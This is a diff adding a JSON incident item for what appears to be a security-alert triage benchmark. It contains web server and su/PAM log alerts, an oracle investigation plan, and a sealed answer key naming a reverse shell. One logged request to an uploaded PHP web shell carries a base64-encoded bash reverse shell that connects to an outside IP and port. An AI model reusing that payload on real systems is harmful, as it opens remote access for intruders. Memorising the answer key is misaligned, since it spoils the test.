@@ -1,0 +1,231 @@
+{
+  "incident_id": "ait-santos-reverse_shell",
+  "name": "AIT-ADS santos/reverse_shell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "santos/reverse_shell",
+  "alert": {
+    "timestamp": "2022-01-17T11:58:04Z",
+    "host": "santos",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on santos: reverse_shell"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-17T11:58:04Z",
+    "end": "2022-01-17T11:58:17Z",
+    "hosts": [
+      "santos"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-ec98dbd3",
+        "timestamp": "2022-01-17T11:58:04Z",
+        "host": "santos",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:58:04 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4yMjkuMi4yMTYvMTY0ODY7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642420684.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:58:04 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4yMjkuMi4yMTYvMTY0ODY7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-13dd491b",
+        "timestamp": "2022-01-17T11:58:17Z",
+        "host": "santos",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 17 11:58:17 intranet-server su[20749]: Successful su for gmorgan by www-data",
+        "raw_alert": {
+          "timestamp": 1642420697.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 17 11:58:17 intranet-server su[20749]: Successful su for gmorgan by www-data"
+        }
+      },
+      {
+        "event_id": "ait-0003-088affbe",
+        "timestamp": "2022-01-17T11:58:17Z",
+        "host": "santos",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 17 11:58:17 intranet-server su[20749]: + /dev/pts/1 www-data:gmorgan",
+        "raw_alert": {
+          "timestamp": 1642420697.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 17 11:58:17 intranet-server su[20749]: + /dev/pts/1 www-data:gmorgan"
+        }
+      },
+      {
+        "event_id": "ait-0004-63ab3bab",
+        "timestamp": "2022-01-17T11:58:17Z",
+        "host": "santos",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 17 11:58:17 intranet-server su[20749]: pam_unix(su:session): session opened for user gmorgan by (uid=33)",
+        "raw_alert": {
+          "timestamp": 1642420697.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 17 11:58:17 intranet-server su[20749]: pam_unix(su:session): session opened for user gmorgan by (uid=33)"
+        }
+      },
+      {
+        "event_id": "ait-0005-9b248b1b",
+        "timestamp": "2022-01-17T11:58:17Z",
+        "host": "santos",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 17 11:58:17 intranet-server systemd-logind[987]: New session c1 of user gmorgan.",
+        "raw_alert": {
+          "timestamp": 1642420697.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 17 11:58:17 intranet-server systemd-logind[987]: New session c1 of user gmorgan."
+        }
+      },
+      {
+        "event_id": "ait-0006-bad8a870",
+        "timestamp": "2022-01-17T11:58:17Z",
+        "host": "santos",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 17 11:58:17 intranet-server systemd: pam_unix(systemd-user:session): session opened for user gmorgan by (uid=0)",
+        "raw_alert": {
+          "timestamp": 1642420697.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 17 11:58:17 intranet-server systemd: pam_unix(systemd-user:session): session opened for user gmorgan by (uid=0)"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-ec98dbd3",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:58:04Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:58:04 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4yMjkuMi4yMTYvMTY0ODY7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642420684.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:58:04 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4yMjkuMi4yMTYvMTY0ODY7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-13dd491b",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:58:17Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 17 11:58:17 intranet-server su[20749]: Successful su for gmorgan by www-data",
+        "raw_alert": {
+          "timestamp": 1642420697.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 17 11:58:17 intranet-server su[20749]: Successful su for gmorgan by www-data"
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-088affbe",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:58:17Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 17 11:58:17 intranet-server su[20749]: + /dev/pts/1 www-data:gmorgan",
+        "raw_alert": {
+          "timestamp": 1642420697.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 17 11:58:17 intranet-server su[20749]: + /dev/pts/1 www-data:gmorgan"
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "santos"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "santos"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on santos: reverse_shell",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "santos"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "santos"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on santos: reverse_shell",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "santos/reverse_shell",
+    "answer": "reverse_shell",
+    "accept": [
+      "reverse_shell",
+      "reverse shell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
